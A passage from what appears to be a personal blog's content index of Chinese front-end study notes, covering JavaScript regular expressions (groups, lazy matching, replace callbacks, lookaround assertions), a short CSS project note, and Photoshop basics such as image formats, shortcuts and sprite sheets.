/^[\\w-]+@([\\w-]+\\.)+(com|org|cc|cn|net)$/i; document.querySelector(&quot;span&quot;).innerHTML = reg_pro.test(this.value)?&quot;正确&quot;:&quot;错误&quot;; &#125;);&lt;/script&gt; 引用分组\\n 在匹配时引用原子组， $n 指在替换时使用匹配的组数据。下面将标签替换为p标签。 123456789&lt;script&gt; let mk = ` &lt;h1&gt;miketaylorjuly&lt;/h1&gt; &lt;span&gt;&lt;/span&gt; &lt;h2&gt;hulu&lt;/h2&gt; `; let reg = /&lt;(h[1-6])&gt;([\\s\\S]+)&lt;\\/\\1&gt;/gi; console.log(mk.replace(reg, &#x27;&lt;p&gt;$2&lt;/p&gt;&#x27;));&lt;/script&gt; 替换进阶 12345678910111213&lt;script&gt; let mk = ` &lt;h1&gt;miketaylorjuly&lt;/h1&gt; &lt;span&gt;&lt;/span&gt; &lt;h2&gt;hulu&lt;/h2&gt; `; let reg = /&lt;(h[1-6])&gt;(\\w([\\s\\S]+))&lt;\\/\\1&gt;/gi; // console.log(mk.replace(reg, &#x27;&lt;p&gt;$2&lt;/p&gt;&#x27;)); let res = mk.replace(reg, (p0,p1,p2,p3)=&gt;&#123; return `&lt;span&gt;$&#123;p2&#125;&lt;/span&gt;`; &#125;); //p0~p3代表不同的括号内容。 console.log(res);&lt;/script&gt; 嵌套分组与不记录组如果只希望组参与匹配，便不希望返回到结果中使用 (?: 处理。下面是获取所有域名的示例。 1234567891011121314151617181920212223&lt;script&gt; let mk = ` https://www.baidu.com https://miketaylorjuly123.cn https://www.google.com `; let reg = /https?:\\/\\/((?:\\w+\\.)?\\w+\\.(?:com|org|cn|cc))/ig; //?:不记录一块数据，也就无法使用\\1或$1这种形式。 console.dir(reg.exec(mk)); console.log(reg.lastIndex); //26 console.dir(reg.exec(mk)); console.log(reg.lastIndex); // 59 console.dir(reg.exec(mk)); console.log(reg.lastIndex); //86 console.dir(reg.exec(mk)); console.log(reg.lastIndex); //0 //使用循环操作 let urls = []; while((res = reg.exec(mk)))&#123; urls.push(res[1]); &#125; console.table(urls);&lt;/script&gt; 分组别名如果希望返回的组数据更清晰，可以为原子组编号，结果将保存在返回的 groups字段中 12let hd = &quot;&lt;h1&gt;miketaylorjuly123.cn&lt;/h1&gt;&quot;;console.dir(hd.match(/&lt;(?&lt;tag&gt;h[1-6])[\\s\\S]*&lt;\\/\\1&gt;/)); 组别名使用 ?&lt;&gt; 形式定义，下面将标签替换为p标签 1234567let hd = ` &lt;h1&gt;miketaylor&lt;/h1&gt; &lt;span&gt;铁憨憨&lt;/span&gt; &lt;h2&gt;macos&lt;/h2&gt;`;let reg = /&lt;(?&lt;tag&gt;h[1-6])&gt;(?&lt;con&gt;[\\s\\S]*)&lt;\\/\\1&gt;/gi;console.log(hd.replace(reg, `&lt;p&gt;$&lt;con&gt;&lt;/p&gt;`)); 重复匹配[#](https://houdunren.gitee.io/note/js/14 正则表达式.html#基本使用-2)基本使用如果要重复匹配一些内容时我们要使用重复匹配修饰符，包括以下几种。 符号 说明 * 重复零次或更多次 + 重复一次或更多次 ? 重复零次或一次 {n} 重复n次 {n,} 重复n次或更多次 {n,m} 重复n到m次 因为正则最小单位是元字符，而我们很少只匹配一个元字符如a、b所以基本上重复匹配在每条正则语句中都是必用到的内容。 多重重复匹配 123456789&lt;script&gt; let mk= &#x27;mkkkkkkkkkk&#x27;; console.log(mk.match(/mk+/)); // + 只影响k，不影响m,贪婪匹配模式。 console.log(mk.match(/mk*/)); // * 表示 0 个或多个 console.log(mk.match(/mk&#123;2,5&#125;/)); // &#123;&#125;为匹配个数限制 console.log(mk.match(/mk&#123;1,&#125;/));// &#123;1,&#125;等价于+ console.log(mk.match(/mk&#123;0,&#125;/));//&#123;0,&#125;等价于* console.log(mk.match(/mk?/)); //?：0个或者1个&lt;/script&gt; 电话匹配正则 123456&lt;script&gt; let mk = &#x27;mkkkkkkkkmkmkmk&#x27;; console.log(mk.match(/(mk)+/g)); // 对原子组后面的+，影响的是整个原子组 let tel = &#x27;0315-3693243&#x27;; console.log(tel.match(/^0\\d&#123;2,3&#125;\\-\\d&#123;7,8&#125;$/));&lt;/script&gt; 网站用户名验证 1234567891011&lt;body&gt; &lt;input type=&quot;text &quot; name=&quot;username&quot;&gt;&lt;/body&gt; &lt;script&gt; document.querySelector(`[name = &quot;username&quot;]`).addEventListener(&#x27;keyup&#x27;,(e)=&gt;&#123; const value =e.target.value; console.log(value); let reg = /^[a-z][\\w-]&#123;2,7&#125;$/i; console.log(reg.test(value)); &#125;); &lt;/script&gt; ​ 批量使用正则完成密码验证 1234567891011121314&lt;script&gt; const input = document.querySelector(`[name=&quot;password&quot;]`); input.addEventListener(&#x27;keyup&#x27;,e=&gt;&#123; const value = e.target.value; //匹配多个正则 const regs = [ /^[a-z0-9]&#123;5,10&#125;$/i, /[A-Z]/, /[0-9]/, ] let state = regs.every(e=&gt;e.test(value)); console.log(state?&quot;正确&quot;:&quot;错误&quot;); &#125;);&lt;/script&gt; 禁止贪婪正则表达式在进行重复匹配时，默认是贪婪匹配模式，也就是说会尽量匹配更多内容，但是有的时候我们并不希望他匹配更多内容，这时可以通过?进行修饰来禁止重复匹配 使用 说明 *? 重复任意次，但尽可能少重复 +? 重复1次或更多次，但尽可能少重复 ?? 重复0次或1次，但尽可能少重复 {n,m}? 重复n到m次，但尽可能少重复 {n,}? 重复n次以上，但尽可能少重复 123456789&lt;script&gt; let mk = &#x27;mkkkkkkk&#x27;; console.log(mk.match(/mk+?/)); console.log(mk.match(/mk*?/)); console.log(mk.match(/mk&#123;2,100&#125;/)); console.log(mk.match(/mk&#123;2,100&#125;?/)); console.log(mk.match(/mk&#123;2,&#125;?/)); console.log(mk.match(/mk??/));//相当于&#123;0,1&#125;?，禁止问号贪婪。&lt;/script&gt; 将所有span更换为h4 并描色，并在内容前加上 铁憨憨- 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;main&gt; &lt;span&gt;wangbuer&lt;/span&gt; &lt;span&gt;baidu.com&lt;/span&gt; &lt;span&gt;miketaylorjuly123.cn&lt;/span&gt; &lt;/main&gt;&lt;/body&gt;&lt;script&gt; //不禁止贪婪是不行的！ const main = document.querySelector(&quot;main&quot;); const reg = /&lt;span&gt;([\\s\\S]+?)&lt;\\/span&gt;/gi; main.innerHTML = main.innerHTML.replace(reg,(v , p1)=&gt;&#123; console.log(p1); return `&lt;h4 style=&quot;color:#8080ff&quot;&gt;铁憨憨--$&#123;p1&#125;&lt;/h4&gt;`; &#125;);&lt;/script&gt;&lt;/html&gt; 下面是使用禁止贪婪查找页面中的标题元素 1234567891011121314&lt;body&gt; &lt;h1&gt; houdunren.com &lt;/h1&gt; &lt;h2&gt;miketaylorjuly123.cn&lt;/h2&gt; &lt;h3&gt;&lt;/H3&gt; &lt;H1&gt;&lt;/H1&gt;&lt;/body&gt;&lt;script&gt; let body = document.body.innerHTML; let reg = /&lt;(h[1-6])&gt;[\\s\\S]*?&lt;\\/\\1&gt;/gi; console.table(body.match(reg));&lt;/script&gt; 全局匹配问题分析使用match 全局获取页面中标签内容，但并不会返回匹配细节。 matchAll在新浏览器中支持使用 matchAll 操作，并返回迭代对象 12345678910111213141516171819&lt;body&gt; &lt;h1&gt;wangbuer&lt;/h1&gt; &lt;h2&gt;baidu.com&lt;/h2&gt; &lt;h1&gt;铁憨憨&lt;/h1&gt;&lt;/body&gt;&lt;script&gt; let reg = /&lt;(h[1-6])&gt;([\\s\\S]+?)&lt;\\/\\1&gt;/ig; const body = document.body; console.log(body.innerHTML.match(reg)); //不能剔除标签，取不到内容，去掉g后取得到，但又不是全局了。 //最新版浏览器的方法：matchAll const mk = body.innerHTML.matchAll(reg); let content = []; console.log(mk); for(const iterator of mk)&#123; console.dir(iterator); content.push(iterator[2]); &#125; console.table(content);&lt;/script&gt; 为低版本浏览器定义原型方法matchAll() 12345678910111213141516171819&lt;body&gt; &lt;h1&gt;wangbuer&lt;/h1&gt; &lt;h2&gt;baidu.com&lt;/h2&gt; &lt;h1&gt;铁憨憨&lt;/h1&gt;&lt;/body&gt;&lt;script&gt; //matchAll String.prototype.matchAll=function(reg)&#123; let res = this.match(reg); if(res)&#123; let str = this.replace(res[0],&quot;^&quot;.repeat(res[0].length)); let match = str.matchAll(reg) || []; return [res,...match]; &#125; &#125;; let body = document.querySelector(`body`).innerHTML; let search = body.matchAll(/&lt;(h[1-6])&gt;([\\s\\S]+?)&lt;\\/\\1&gt;/); console.log(search)&lt;/script&gt; exec使用 g 模式修正符并结合 exec 循环操作可以获取结果和匹配细节 一定要用模式g!!! 123456789101112131415&lt;body&gt; &lt;h1&gt;wangbuer&lt;/h1&gt; &lt;h2&gt;baidu.com&lt;/h2&gt; &lt;h1&gt;铁憨憨&lt;/h1&gt;&lt;/body&gt;&lt;script&gt; function search(string, reg) &#123; const matchs = []; while ((data = reg.exec( string))) &#123; matchs.push(data); &#125; return matchs; &#125; console.log(search(document.body.innerHTML, /&lt;(h[1-6])&gt;[\\s\\S]+?&lt;\\/\\1&gt;/gi));&lt;/script&gt; 字符方法下面介绍的方法是 String 提供的支持正则表达式的方法 searchsearch() 方法用于检索字符串中指定的子字符串，也可以使用正则表达式搜索，返回值为索引位置 match直接使用字符串搜索。 1234567891011121314&lt;script&gt; let mk = &quot;miketaylorjuly123.cn&quot;; console.log(mk.search(&quot;.cn&quot;)); //17 console.log(mk.search(&quot;.@&quot;)); //-1 let mk2 = ` https://miketaylorjuly123.cn https://www.sina.com.cn https://www.baidu.com `; let reg = /https?:\\/\\/(\\w+\\.)?(\\w+\\.)+(com|cn|org|cc)/gi; console.log(mk2.match(reg));&lt;/script&gt; matchAll在新浏览器中支持使用 matchAll 操作，并返回迭代对象，返回由细节！ split用于使用字符串或正则表达式分隔字符串，下面是使用字符串分隔日期 123456789101112131415161718&lt;script&gt; let mk2 = ` https://miketaylorjuly123.cn https://www.sina.com.cn https://www.baidu.com `; let reg = /https?:\\/\\/(\\w+\\.)?(\\w+\\.)+(com|cn|org|cc)/gi; console.table(mk2.match(reg)); console.log(mk2.matchAll(reg));//返回迭代器 for (const iterator of mk2.matchAll(reg)) &#123; console.table(iterator); &#125;; //split按照给出的模板匹配。 let mk = &quot;2021/05/29&quot;; console.log(mk.split(/[\\/-]/));&lt;/script&gt; replacereplace 方法不仅可以执行基本字符替换，也可以进行正则替换，下面替换日期连接符 12let str = &quot;2023/02/12&quot;;console.log(str.replace(/\\//g, &quot;-&quot;)); //2023-02-12 123456&lt;script&gt; let mk = &#x27;(010)65313213 (020)3468621&#x27;; let reg = /\\((\\d&#123;3,4&#125;)\\)(\\d&#123;7,8&#125;)/g; // console.log(mk.match(reg)); console.log(mk.replace(reg, &#x27;$1-$2&#x27;));&lt;/script&gt; 替换字符串可以插入下面的特殊变量名： 变量 说明 $$ 插入一个 “$”。 $&amp; 插入匹配的子串。 $` 插入当前匹配的子串左边的内容。 $&#39; 插入当前匹配的子串右边的内容。 $n 假如第一个参数是 RegExp 对象，并且 n 是个小于100的非负整数，那么插入第 n 个括号匹配的字符串。提示：索引是从1开始 123456789101112&lt;script&gt; // let mk = &#x27;(010)65313213 (020)3468621&#x27;; // let reg = /\\((\\d&#123;3,4&#125;)\\)(\\d&#123;7,8&#125;)/g; // // console.log(mk.match(reg)); // console.log(mk.replace(reg, &#x27;$1-$2&#x27;)); //$` $&#x27; $&amp; let mk = &#x27;=%铁憨憨@=&#x27;; console.log(mk.replace(/铁憨憨/,&quot;==$&amp;==&quot;)); //$&amp;表示匹配到的内容 console.log(mk.replace(/铁憨憨/,&quot;$`&quot;)); //把匹配到的内容替换为匹配到的内容的前面部分 console.log(mk.replace(/铁憨憨/,&quot;$&#x27;&quot;)); //把匹配到的内容替换为匹配到的内容的后面部分&lt;/script&gt; 把所有准则汉字加上链接 百度百科链接。 123456789&lt;body&gt; &lt;main&gt; 核心价值观，简单来说就是某一社会群体判断社会事务时依据的是非标准，遵循的行为准则。 &lt;/main&gt;&lt;/body&gt;&lt;script&gt; const main = document.querySelector(&quot;body main&quot;); main.innerHTML = main.innerHTML.replace(/准则/g,`&lt;a href=&quot;https://baike.baidu.com/item%E6%A0%B8%E5%BF%83%E4%BB%B7%E5%80%BC%E8%A7%82/6946423?fr=aladdin&quot;&gt;$&amp;&lt;/a&gt;`);&lt;/script&gt; 为链接添加上https ，并补全 www. 12345678910111213141516171819&lt;body&gt; &lt;main&gt; &lt;a style=&quot;color:red&quot; href=&quot;http://www.hdcms.com&quot;&gt; 开源系统 &lt;/a&gt; &lt;a id=&quot;l1&quot; href=&quot;http://houdunren.com&quot;&gt;后盾人&lt;/a&gt; &lt;a href=&quot;http://yahoo.com&quot;&gt;雅虎&lt;/a&gt; &lt;h4&gt;http://www.hdcms.com&lt;/h4&gt; &lt;/main&gt;&lt;/body&gt;&lt;script&gt; const main = document.querySelector(&quot;body main&quot;); const reg = /(&lt;a.*href=[&#x27;&quot;])(http)(:\\/\\/)(www\\.)?(hdcms|houdunren)/gi; main.innerHTML = main.innerHTML.replace(reg, (v, ...args) =&gt; &#123; args[1] += &quot;s&quot;; args[3] = args[3] || &quot;www.&quot;; return args.splice(0, 5).join(&quot;&quot;); &#125;);&lt;/script&gt; 把h标签全换成h4。 123456789&lt;script&gt; let mk = ` &lt;h1&gt;miketaylor&lt;/h1&gt; &lt;span&gt;铁憨憨&lt;/span&gt; &lt;h2&gt;baidu&lt;/h2&gt; `; const reg = /&lt;(h[1-6])&gt;(?&lt;con&gt;.*?)&lt;\\/\\1&gt;/g; console.log(mk.replace(reg,&#x27;&lt;h4&gt;&lt;con&gt;&lt;h4&gt;&#x27;));&lt;/script&gt; 使用原子组命名优化正则 123456789101112131415161718&lt;body&gt; &lt;main&gt; &lt;a href=&quot;miketaylorjuly123.cn&quot;&gt;个人站点&lt;/a&gt; &lt;a href=&quot;www.baidu.com&quot;&gt;百度&lt;/a&gt; &lt;a href=&quot;www.google.com&quot;&gt;谷歌&lt;/a&gt;&lt;/main&gt;&lt;/body&gt;&lt;script&gt; // [&#123;link:&#x27;&#x27;,title:&#x27;&#x27;&#125;]提取结果 const main = document.querySelector(&quot;body main&quot;); const reg = /&lt;a.*?href=([&quot;&#x27;])(?&lt;link&gt;.*?)\\1&gt;(?&lt;title&gt;.*?)&lt;\\/a&gt;/gi; // console.log(main.innerHTML.match(reg)); const links = []; for (const iterator of main.innerHTML.matchAll(reg))&#123; links.push(iterator[&quot;groups&quot;]); &#125; console.log(links);&lt;/script&gt; test方法 123456789101112&lt;body&gt; &lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;/body&gt;&lt;script&gt; const mail = document.querySelector(`[name=&quot;email&quot;]`); mail.addEventListener(&quot;keyup&quot;,e=&gt;&#123; let value = e.target.value; //允许aaaaaaa@sina.com.cn这种结构 let flag = /^[\\w-]+@(\\w+\\.)+(com|cn|cc|org)$/i.test(value); console.log(flag); &#125;);&lt;/script&gt; 回调函数 replace 支持回调函数操作，用于处理复杂的替换逻辑 变量名 代表的值 match 匹配的子串。（对应于上述的$&amp;。） p1,p2, ... 假如replace()方法的第一个参数是一个 RegExp 对象，则代表第n个括号匹配的字符串。（对应于上述的$1，$2等。）例如，如果是用 /(\\a+)(\\b+)/ 这个来匹配，p1 就是匹配的 \\a+，p2 就是匹配的 \\b+。 offset 匹配到的子字符串在原字符串中的偏移量。（比如，如果原字符串是 &#39;abcd&#39;，匹配到的子字符串是 &#39;bc&#39;，那么这个参数将会是 1） string 被匹配的原字符串。 NamedCaptureGroup 命名捕获组匹配的对象 使用回调函数将 后盾人 添加上链接 12345678910111213141516&lt;body&gt; &lt;div class=&quot;content&quot;&gt; 后盾人不断更新优质视频教程 &lt;/div&gt;&lt;/body&gt;&lt;script&gt; let content = document.querySelector(&quot;.content&quot;); content.innerHTML = content.innerHTML.replace(&quot;后盾人&quot;, function( search, pos, source ) &#123; return `&lt;a href=&quot;https://www.houdunren.com&quot;&gt;$&#123;search&#125;&lt;/a&gt;`; &#125;);&lt;/script&gt; 为所有标题添加上 hot 类 12345678910111213141516171819202122232425&lt;body&gt; &lt;div class=&quot;content&quot;&gt; &lt;h1&gt;后盾人&lt;/h1&gt; &lt;h2&gt;houdunren.com&lt;/h2&gt; &lt;h1&gt;后盾人&lt;/h1&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; let content = document.querySelector(&quot;.content&quot;); let reg = /&lt;(h[1-6])&gt;([\\s\\S]*?)&lt;\\/\\1&gt;/gi; content.innerHTML = content.innerHTML.replace( reg, ( search, //匹配到的字符 p1, //第一个原子组 p2, //第二个原子组 index, //索引位置 source //原字符 ) =&gt; &#123; return ` &lt;$&#123;p1&#125; class=&quot;hot&quot;&gt;$&#123;p2&#125;&lt;/$&#123;p1&#125;&gt; `; &#125; );&lt;/script&gt; 断言匹配断言虽然写在扩号中但它不是组，所以不会在匹配结果中保存，可以将断言理解为正则中的条件。 (?=exp)零宽先行断言 ?=exp 匹配后面为 exp 的内容 把后面是就 的miketaylor加上链接 123456789 &lt;main&gt; miketaylor会不断学习，所以，只要坚持，miketaylor就会成为全栈！ &lt;/main&gt;&lt;/body&gt;&lt;script&gt; let main = document.querySelector(&#x27;body main&#x27;); let reg = /miketaylor(?=就)/g; //?=后面为条件 main.innerHTML = main.innerHTML.replace(reg,`&lt;a href=&quot;http://miketaylorjuly123.cn&quot;&gt;$&amp;&lt;/a&gt;`);&lt;/script&gt; 使用断言规范分数 123456789101112131415&lt;script&gt; let mk = ` Data Structure,90分 Computer Network,90分 Operation system,85.0分 Artificial Vision,100分 `; let reg = /(\\d+)(.0)?(?=分)/gi; let mk2 = mk.replace(reg, (v, ... args)=&gt;&#123; console.log(args); args[1] = args[1] || &#x27;.0&#x27;; return args.splice(0,2).join(&#x27;&#x27;); &#125;); console.log(mk2)&lt;/script&gt; 使用断言验证用户名必须为五位，下面正则体现断言是不是组，并且不在匹配结果中记录 123456789101112&lt;body&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;/body&gt;&lt;script&gt; document .querySelector(`[name=&quot;username&quot;]`) .addEventListener(&quot;keyup&quot;, function() &#123; let reg = /^(?=[a-z]&#123;5&#125;$)/i; console.log(reg.test(this.value)); &#125;);&lt;/script&gt; (?&lt;=exp)零宽后行断言 ?&lt;=exp 匹配前面为 exp 的内容 匹配miketaylor后面的数字 12345&lt;script&gt; let mk = &quot;miketaylorjuly123.cn&quot;; let reg = /(?&lt;=miketaylorjuly)\\d+/i; console.log(mk.match(reg)); //123&lt;/script&gt; 所有超链接替换为https://miketaylorjuly123.cn 1234567&lt;script&gt; //网址替换 const main = document.querySelector(&quot;main&quot;); let reg = /(?&lt;=href=([&#x27;&quot;])).+(?=\\1)/ig; // console.log(main.innerHTML.match(reg)); main.innerHTML = main.innerHTML.replace(reg,&quot;https://miketaylorjuly123.cn&quot;);&lt;/script&gt; 使用断言模糊电话号码 123456789101112&lt;script&gt; let users = ` 我的电话:15583703266 备用电话:15581664469 `; let reg = /(?&lt;=\\d&#123;7&#125;)\\d&#123;4&#125;/gi; users = users.replace(reg , (v) =&gt;&#123; return &#x27;*&#x27;.repeat(4); &#125;); console.log(users);&lt;/script&gt; 获取标题中的内容 123let hd = `&lt;h1&gt;我真的是铁憨憨&lt;/h1&gt;`;let reg = /(?&lt;=&lt;h1&gt;).*(?=&lt;\\/h1&gt;)/g;console.log(hd.match(reg)); (?!exp)零宽负向先行断言 后面不能出现 exp 指定的内容 使用 (?!exp)字母后面不能为两位数字 12345&lt;script&gt; let mk = &#x27;miketaylorjuly1232013dada&#x27;; let reg = /[a-z]+(?!\\d)$/i; console.log(mk.match(reg));&lt;/script&gt; 断言限制用户关键词 12345678910&lt;body&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/body&gt;&lt;script&gt; const input = document.querySelector(`[name=&quot;username&quot;]`); input.addEventListener(&#x27;keyup&#x27;, function()&#123; let reg = /^(?!.*加加林.*)[a-z]&#123;5,6&#125;$/i; console.log(this.value.match(reg)) &#125;)&lt;/script&gt; (?&lt;!exp)零宽负向后行断言 前面不能出现exp指定的内容 获取前面不是数字的字符 1234567&lt;script&gt; let mk = &#x27;miketaylorjuly1232013dada&#x27;; let reg = /(?&lt;!\\d+)[a-z]+/i; let reg2 = /(?&lt;!\\d+).+/i; console.log(mk.match(reg)); console.log(mk.match(reg2));&lt;/script&gt; 使用断言排除法同一数据 12345678910111213141516&lt;body&gt; &lt;main&gt; &lt;a href=&quot;https://www.houdunren.com/1.jpg&quot;&gt;1.jpg&lt;/a&gt; &lt;a href=&quot;https://oss.houdunren.com/2.jpg&quot;&gt;2.jpg&lt;/a&gt; &lt;a href=&quot;https://cdn.houdunren.com/2.jpg&quot;&gt;3.jpg&lt;/a&gt; &lt;a href=&quot;https://houdunren.com/2.jpg&quot;&gt;3.jpg&lt;/a&gt; &lt;/main&gt;&lt;/body&gt;&lt;script&gt; const main = document.querySelector(&quot;main&quot;); const reg = /https:\\/\\/(\\w+)?(?&lt;!oss)\\..+?(?=\\/)/gi; main.innerHTML = main.innerHTML.replace(reg, v =&gt; &#123; console.log(v); return &quot;https://oss.houdunren.com&quot;; &#125;);&lt;/script&gt; 上完正则啦，感谢后端人教程UP主。","categories":[],"tags":[{"name":"JS","slug":"JS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/JS/"}]},{"title":"项目实战—纽曼官网实现","slug":"前端学习14","date":"2021-05-21T05:42:13.000Z","updated":"2021-05-25T12:14:33.495Z","comments":true,"path":"2021/05/21/前端学习14/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/05/21/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A014/","excerpt":"","text":"代码格式化：Ctrl +Alt+L 文件格式化：Ctrl +Alt+Shift+L 行级标签里不能加块级标签。 &gt;：只作用于某标签的儿子，孙子中有满足的标签会被忽略 1234567.welcome&gt;p&#123; font-size: 14px; color: #666; padding: 0 85px 0 80px; line-height: 24px; text-align: center;&#125; 学会如何用border+border-left+border-right+border-bottom+border-top绘制三角形。 复杂工程问题中，注意标签的权重。 !important(10000)&gt;内联样式（1000）&gt;ID选择器（100）&gt;类、伪类选择器（10）&gt;标签选择器（1） 1","categories":[],"tags":[{"name":"前端实战","slug":"前端实战","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AE%9E%E6%88%98/"}]},{"title":"PhotoShop基础","slug":"前端学习13","date":"2021-05-10T04:46:09.000Z","updated":"2021-05-24T09:09:53.168Z","comments":true,"path":"2021/05/10/前端学习13/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/05/10/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A013/","excerpt":"","text":"第十章 PhotoShop基础课程提要 认识PhotoShop图像基础 工具使用与快捷操作 图片优化 精灵图 安装PS和cutterman插件。 10.1 基本概念 PS由美国Adobe公司开发的一款用来处理图像的软件。Adobe开发了另外一款软件Illustrator(AI)，它用来作图，主要跟加拿大开发的CorelDRAW抢占市场。 PS用来处理位图的，AI用来处理矢量图。 位图是由像素点组成的，文件较大，放大会失真，一般用来表示人物、风景等；矢量图由线条组成，文件较小，放大后不会失真，一般用来表示工程图等，由若干个几何图形拼接而成。 PS使用位图来表示黑白图像，其逻辑为每一个像素对应一个数据位。位图又称为点阵图，是一系列像素组成的可识别的图像，位图图像与分辨率有关，任何位图图像都含有有限数目的像素。 矢量图与分辨率无关，其形状通过数学方程描述，由边线和内部填充组成。 分辨率：又称解析度/解像度，可分为：显示分辨率、图像分辨率、打印分辨率、扫描分辨率等。 图像分辨率：单位英寸中所包含的像素点数，分辨率越高，图像越清晰，但是相应的文件也越大。 位分辨率：又叫色彩深度或位深度，批一个像素中，每个颜色分量（R,G,B,Alpha通道）的比特数。 位指的是二进制或比特(bit)。 常见的位分辨率： 1位：两种颜色（黑白两种）。 2位：四种颜色。 3位：八种颜色（用于早期的电脑显示器）。 8位：256种颜色，灰阶，有256种灰色（包括黑白）。 16位：可以组合出64K种颜色。 24位：2^24种颜色，真彩色，可以提供比肉眼能识别更多的颜色，主要用于拍摄照片。 位数越高，越接近生活中的真彩色，但文件也就越大。 网页所支持的图片格式 .jpg：压缩格式图片，24位颜色存储单个位图。 支持最高级别的压缩，文件相应变小，但这种压缩是有损耗的，压缩率越大的图片，显示的内容就越模糊。 .png：一种无损压缩的位图图形格式，是网页常用的图片格式，原因是它压缩比高，生成文件体积小。同时支持背景透明效果，使彩色图像的边缘能与任何背景平滑的融合，从而彻底消除锯齿边缘。 .gif：可以存储多幅彩色图像，如果把存于一个文件中的多幅图像数据逐幅读出输出到屏幕上，就可以构成一种最简单的动画，也就是我们常见的动图。GIF图片不一定就是动图，其也可以是一张图片，由于其具有高压缩的算法，所以网页中也常有出现不是动图的GIF图。 .svg： HTML 5 新增的矢量图，一般用来作为图标字符。 Base64（图像编码）：设计时把图像文件解析成字符编码，浏览器会自动将其再还原为图像。图像越大，编码量越大，所以一般不对大图做base64编码处理。 Base64图片编码 网站 1&lt;img src=&#x27;编码&#x27; alt=&quot;&quot;&gt; 由于编码量大，一般不用这种方法。 .ico或.cur：图标文件，一般用作网站的LOGO。 12/*link:favicon*/&lt;link rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot; href=&quot;路径&quot;&gt; .psd：psd是PS所特有的文件格式，它含有图层。一般UI工程师给的UI图是psd格式，可以用它切图。 10.2 SVG矢量图使用方法 进入 [官网](Icon Font &amp; SVG Icon Sets ❍ IcoMoon) 上传SVG图导入网站，选中后下载。 使用：将fonts、style.css复制到项目中。 将style.css引入到网页文件中。 使用： 用类名引入图标，并在图标名前添加前缀icon-。 像处理文字一样写大小和颜色。 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;加载SVG图片&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./svg/style.css&quot;&gt; &lt;style&gt; span&#123; background-color: #8080ff; font-size: 30px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;span class=&quot;icon-01&quot;&gt;&lt;/span&gt;&lt;/body&gt;&lt;/html&gt; 10.3 PS工具使用与快捷键操作 功能 快捷键 新建文件夹 Ctrl+N 打开文件 Ctrl+O 保存文件 Ctrl+S 关闭文件 Ctrl+W 打开/隐藏图层调板 F7 前景色填充 Alt + Delete 背景色填充 Ctrl + Delete 交换前景色/背景色 X 前景色/背景色还原为黑白色 D 取消选区 Ctrl + D 变换大小和旋转方向 Ctrl + T 移动工具 V 变换形状 shift + 鼠标 沿中心缩放 Alt + Shift 缩放工具 Z 选框工具 M 抓手工具 H 切片工具 C 渐变工具 G 文字工具 T 撤销一次操作 Ctrl + Z 撤销多次操作 Ctrl + Shift +Z 颜色调板 F6 画笔调板 F5 信息调板 F8 动作调板 F9 新建图层 Ctrl + Shift + N 向下合并图层 Ctrl + E 复制选区 Alt + 鼠标拖动 导出切片 Ctrl + Alt + Shift + S PS操作 缩放 双击”缩放工具“，可以将图像显示比例调成100%。 Alt+鼠标滚轮可以缩放图像显示比例。 鼠标向左下/右上（左下/右上）移动。 颜色模式 灰度：采用256级灰阶，包括黑白 位图：黑白图 RGB：显示色，用于屏幕显示。（网页采用RGB模式） CMYK：油墨色，也叫打印色。 新建文件时分辨率设置 用于显示的图像的分辨率设为72ppi左右 一般打印的图像的分辨率为170ppi左右 高精度打印图像分辨率为300ppi左右 如果要创建的图像文件最终存为PNG格式，背景要设为透明。 在PS中图像编辑时，实际图像由多个图层构成。 填充：编辑-&gt;填充 工具箱分为 选框或选择工具区 绘图区/编辑区 绘矢量图区和文字编辑区 缩放区/颜色/蒙版区 补充 魔棒工具：选择颜色相近的区域 栅格化：把文字层转化为图层 蒙版：处理选区 图层操作 锁定图层 图层对齐 创建图层组 调整色阶和 10.4 图片优化雪碧图（Sprites）制作也叫精灵图(一般为PNG格式)，是把多张小图放在一张大图中，目的是减少服务器请求次数，达到优化目的。 优点： 减少http请求次数 减少图片数量，提升网页加载速度 减少网络带宽占用 缺点 提高了网页开发成本和维护成本 合并内容性图片会影响页面的可读性，语义化降低 应用场景 一般只有描述性图片用来制作雪碧图，比如页面中使用的各种小标。 按钮背景图及其各种效果的图片，适合做成雪碧图。 对于img标签设置的内容性图片，是不能合成到雪碧图中的。 开发游戏中使用的素材图片。 制作规范 图片在合并之前必须保留空隙 图片排列方式由横向和纵向(最好不要多行多列排) 合并分类规则 把同属一个模块的图片进行合并 把大小相近的图片进行合并 把色彩相近的图片进行合并 必须保存为PNG格式 去水印与版权问题 仿制图章工具 修复画笔工具 修补工具 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;精灵图的使用&lt;/title&gt; &lt;style&gt; ul&#123; list-style-type: none; &#125; .icon1&#123; width: 29px; height: 27px; display: inline-block; background: url(&quot;./imgs/sprites2.png&quot;) -6px -6px; &#125; .icon2&#123; width: 28px; height: 27px; display: inline-block; background: url(&quot;./imgs/sprites2.png&quot;) -40px -6px; &#125; .icon3&#123; width: 26px; height: 